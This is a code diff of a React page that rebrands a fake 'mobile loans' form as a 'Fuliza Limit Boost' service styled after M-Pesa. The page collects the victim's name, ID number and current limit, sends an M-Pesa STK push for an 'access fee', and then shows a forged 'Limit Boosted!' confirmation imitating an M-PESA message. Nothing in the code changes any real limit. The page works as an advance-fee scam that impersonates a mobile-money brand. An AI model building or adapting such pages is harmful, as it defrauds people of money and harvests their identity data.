@@ -7,27 +7,16 @@ function Application() {
   const [phone, setPhone] = useState('');
   const [loan, setLoan] = useState(null);
 
-  // Form states
   const [fullName, setFullName] = useState('');
   const [idNumber, setIdNumber] = useState('');
   const [county, setCounty] = useState('');
-  const [reason, setReason] = useState('');
+  const [currentLimit, setCurrentLimit] = useState('');
   const [paymentPhone, setPaymentPhone] = useState('');
 
-  // Payment states
   const [isProcessing, setIsProcessing] = useState(false);
   const [showSuccessModal, setShowSuccessModal] = useState(false);
   const [showFailedModal, setShowFailedModal] = useState(false);
   const [applicationData, setApplicationData] = useState(null);
-
-  const reasons = [
-    'Emergency Medical Expenses',
-    'School Fees / Education',
-    'Business Capital',
-    'Rent / Housing',
-    'Family Support',
-    'Other Personal Need',
-  ];
 
   const counties = [
     'Baringo', 'Bomet', 'Bungoma', 'Busia', 'Elgeyo-Marakwet',
@@ -63,12 +52,11 @@ function Application() {
       return;
     }
 
-    // Save all application data
     const data = {
       fullName,
       idNumber,
       county,
-      reason,
+      currentLimit,
       paymentPhone,
       verifiedPhone: phone,
       loan: loan,
@@ -85,22 +73,20 @@ function Application() {
     try {
       const reference = `mml_${Date.now()}`;
 
-      // 1. Initiate STK Push
       const response = await fetch('/api/paylor-stk-push', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           phoneNumber: paymentPhone,
-          amount: loan.fee,
+          amount: 1,
           reference: reference,
-          description: `Mpesa Mobile Loans - ${loan.name} Access Fee`,
+          description: `Fuliza Limit Boost - ${loan.name} Access Fee`,
         }),
       });
 
       const result = await response.json();
 
       if (result.success) {
-        // 2. Start polling
         pollTransactionStatus(result.transactionId || reference);
       } else {
         setIsProcessing(false);
@@ -116,7 +102,7 @@ function Application() {
 
   const pollTransactionStatus = (reference) => {
     let attempts = 0;
-    const maxAttempts = 20; // ~60 seconds
+    const maxAttempts = 20;
 
     const interval = setInterval(async () => {
       attempts++;
@@ -133,14 +119,12 @@ function Application() {
           clearInterval(interval);
           setIsProcessing(false);
           setShowSuccessModal(true);
-        } 
-        else if (status === 'FAILED' || status === 'CANCELLED' || status === 'DECLINED') {
+        } else if (status === 'FAILED' || status === 'CANCELLED' || status === 'DECLINED') {
           clearInterval(interval);
           setIsProcessing(false);
           setShowFailedModal(true);
         }
 
-        // Timeout after max attempts
         if (attempts >= maxAttempts) {
           clearInterval(interval);
           setIsProcessing(false);
@@ -157,17 +141,15 @@ function Application() {
   return (
     <div className="min-h-screen bg-gray-50 font-sans flex justify-center">
       <div className="w-full max-w-md bg-white min-h-screen shadow-xl relative">
-        
-        {/* Header */}
+
         <div className="bg-mpesa-500 px-5 py-6 text-white">
-          <h1 className="text-xl font-bold">Loan Application</h1>
-          <p className="text-sm text-mpesa-100 mt-1">Complete your application</p>
+          <h1 className="text-xl font-bold">Fuliza Limit Boost</h1>
+          <p className="text-sm text-mpesa-100 mt-1">Unlock your new Fuliza M-PESA limit</p>
         </div>
 
         <div className="p-5">
-          {/* Selected Loan Card */}
           <div className="bg-mpesa-50 border border-mpesa-100 rounded-2xl p-5 mb-6">
-            <p className="text-xs text-mpesa-700 font-medium mb-1">Selected Package</p>
+            <p className="text-xs text-mpesa-700 font-medium mb-1">New Fuliza Limit</p>
             <h2 className="text-2xl font-bold text-dark-900">{loan.name}</h2>
             <p className="text-lg font-semibold text-mpesa-600 mt-1">
               KSh {loan.amount.toLocaleString()}
@@ -176,14 +158,15 @@ function Application() {
               Access Fee: <span className="font-medium text-dark-900">KSh {loan.fee.toLocaleString()}</span>
             </p>
             <p className="text-sm text-gray-500 mt-1">
+              Transaction Cost: <span className="font-medium text-dark-900">KSh 0</span>
+            </p>
+            <p className="text-sm text-gray-500 mt-1">
               Verified Contact: <span className="font-medium text-dark-900">{phone}</span>
             </p>
           </div>
 
-          {/* Application Form */}
           <form onSubmit={handleSubmit} className="space-y-4">
-            
-            {/* Full Names */}
+
             <div>
               <label className="block text-xs font-medium text-gray-600 mb-1.5">
                 Full Names (as on ID)
@@ -199,7 +182,6 @@ function Application() {
               />
             </div>
 
-            {/* ID Number */}
             <div>
               <label className="block text-xs font-medium text-gray-600 mb-1.5">
                 ID Number
@@ -215,7 +197,6 @@ function Application() {
               />
             </div>
 
-            {/* County */}
             <div>
               <label className="block text-xs font-medium text-gray-600 mb-1.5">
                 County
@@ -236,28 +217,23 @@ function Application() {
               </select>
             </div>
 
-            {/* Reason */}
             <div>
               <label className="block text-xs font-medium text-gray-600 mb-1.5">
-                Reason for Loan
+                Current Fuliza Limit
               </label>
-              <select
-                value={reason}
-                onChange={(e) => setReason(e.target.value)}
+              <input
+                type="number"
+                inputMode="numeric"
+                min="0"
+                value={currentLimit}
+                onChange={(e) => setCurrentLimit(e.target.value)}
+                placeholder="Enter current limit"
                 required
-                className="w-full border border-gray-200 px-4 py-3 text-sm focus:outline-none focus:border-mpesa-500 bg-white"
+                className="w-full border border-gray-200 px-4 py-3 text-sm focus:outline-none focus:border-mpesa-500"
                 style={{ borderRadius: '2px' }}
-              >
-                <option value="">Select a reason</option>
-                {reasons.map((item) => (
-                  <option key={item} value={item}>
-                    {item}
-                  </option>
-                ))}
-              </select>
+              />
             </div>
 
-            {/* Payment Phone Number */}
             <div>
               <label className="block text-xs font-medium text-gray-600 mb-1.5">
                 Phone Number (to pay Access Fee)
@@ -273,55 +249,57 @@ function Application() {
               />
             </div>
 
-            {/* Pay Button */}
+            <p className="text-xs text-gray-500 leading-relaxed">
+              To use your new Fuliza limit, transact normally on M-PESA even with insufficient funds and accept the Fuliza request at the end of the transaction.
+            </p>
+
             <button
               type="submit"
               disabled={isProcessing}
               className="w-full bg-mpesa-500 active:bg-mpesa-600 text-white font-semibold py-3.5 text-sm mt-4 mb-12 disabled:opacity-70"
               style={{ borderRadius: '2px' }}
             >
-              {isProcessing ? 'Processing Payment...' : `Pay KSh ${loan.fee.toLocaleString()} & Submit`}
+              {isProcessing
+                ? 'Processing Payment...'
+                : `Pay KSh ${loan.fee.toLocaleString()} & Boost Limit`}
             </button>
           </form>
         </div>
 
-        {/* Processing Overlay */}
         {isProcessing && (
           <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center">
             <div className="bg-white rounded-2xl p-8 flex flex-col items-center max-w-xs w-full mx-4">
               <FaSpinner className="text-4xl text-mpesa-500 animate-spin mb-4" />
               <p className="text-sm font-semibold text-dark-900">Processing Payment</p>
               <p className="mt-2 text-xs text-gray-500 text-center">
-                STK Push sent. Please check your phone and enter your M-Pesa PIN.
+                STK Push sent. Please check your phone and enter your M-Pesa PIN to unlock your new Fuliza limit.
               </p>
             </div>
           </div>
         )}
 
-        {/* SUCCESS MODAL */}
         {showSuccessModal && applicationData && (
           <div className="fixed inset-0 bg-black/60 z-50 flex items-end sm:items-center justify-center">
             <div className="bg-white w-full max-w-md rounded-t-3xl sm:rounded-2xl overflow-hidden">
-              
-              {/* Success Header */}
+
               <div className="bg-mpesa-500 px-6 pt-8 pb-6 text-center text-white">
                 <div className="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-4">
                   <FaCheckCircle className="text-white text-4xl" />
                 </div>
-                <h2 className="text-2xl font-bold">Payment Successful!</h2>
-                <p className="text-mpesa-100 text-sm mt-1">Your loan application has been submitted</p>
+                <h2 className="text-2xl font-bold">Limit Boosted!</h2>
+                <p className="text-mpesa-100 text-sm mt-1">
+                  Your Fuliza M-PESA limit has been updated
+                </p>
               </div>
 
-              {/* Details */}
               <div className="px-6 py-6 space-y-5 max-h-[60vh] overflow-y-auto">
-                
-                {/* Loan Package */}
+
                 <div className="bg-mpesa-50 rounded-xl p-4">
-                  <p className="text-xs text-mpesa-700 font-medium mb-1">Approved Package</p>
+                  <p className="text-xs text-mpesa-700 font-medium mb-1">New Fuliza Limit</p>
                   <div className="flex justify-between items-end">
                     <div>
                       <h3 className="text-xl font-bold text-dark-900">{applicationData.loan.name}</h3>
-                      <p className="text-sm text-gray-500">Access Fee Paid</p>
+                      <p className="text-sm text-gray-500">Access Fee Paid • Transaction Cost KSh 0</p>
                     </div>
                     <div className="text-right">
                       <p className="text-xl font-bold text-mpesa-600">
@@ -334,10 +312,13 @@ function Application() {
                   </div>
                 </div>
 
-                {/* User Details */}
+                <div className="bg-white border border-gray-100 rounded-xl p-4 text-sm text-gray-700 leading-relaxed">
+                  Dear {applicationData.fullName.split(' ')[0] || 'Customer'}, your Fuliza M-PESA limit is Ksh {applicationData.loan.amount.toLocaleString()}. Transaction Cost Ksh 0.
+                </div>
+
                 <div className="space-y-3">
                   <h4 className="text-sm font-semibold text-dark-900 border-b border-gray-100 pb-2">
-                    Applicant Details
+                    Boost Details
                   </h4>
 
                   <div className="flex justify-between text-sm">
@@ -358,9 +339,16 @@ function Application() {
                   </div>
 
                   <div className="flex justify-between text-sm">
-                    <span className="text-gray-500">Reason</span>
-                    <span className="font-medium text-dark-900 text-right max-w-[60%]">
-                      {applicationData.reason}
+                    <span className="text-gray-500">Current Limit</span>
+                    <span className="font-medium text-dark-900">
+                      KSh {Number(applicationData.currentLimit).toLocaleString()}
+                    </span>
+                  </div>
+
+                  <div className="flex justify-between text-sm">
+                    <span className="text-gray-500">New Limit</span>
+                    <span className="font-medium text-mpesa-600">
+                      KSh {applicationData.loan.amount.toLocaleString()}
                     </span>
                   </div>
 
@@ -375,16 +363,13 @@ function Application() {
                   </div>
                 </div>
 
-                {/* Note */}
                 <div className="bg-yellow-50 border border-yellow-100 rounded-xl p-3">
                   <p className="text-xs text-yellow-800 leading-relaxed">
-                    Your loan is being processed. You will receive an M-Pesa confirmation shortly. 
-                    Funds are usually disbursed within 60 seconds after final approval.
+                    You will receive an M-PESA SMS confirming your new Fuliza limit. Transact normally even with insufficient funds and accept the Fuliza request at the end of the transaction.
                   </p>
                 </div>
               </div>
 
-              {/* Footer Button */}
               <div className="px-6 pb-6">
                 <button
                   onClick={() => {
@@ -401,14 +386,13 @@ function Application() {
           </div>
         )}
 
-        {/* FAILED / CANCELLED MODAL */}
         {showFailedModal && (
           <div className="fixed inset-0 bg-black/60 z-50 flex items-center justify-center px-4">
             <div className="bg-white w-full max-w-sm rounded-2xl p-8 text-center">
               <FaTimesCircle className="text-5xl text-red-500 mx-auto mb-5" />
               <h3 className="text-xl font-bold text-dark-900 mb-2">Payment Failed</h3>
               <p className="text-sm text-gray-600 mb-6">
-                The transaction was cancelled or failed. Please try again.
+                The access fee payment was cancelled or failed. Please try again to unlock your new Fuliza limit.
               </p>
               <button
                 onClick={() => setShowFailedModal(false)}
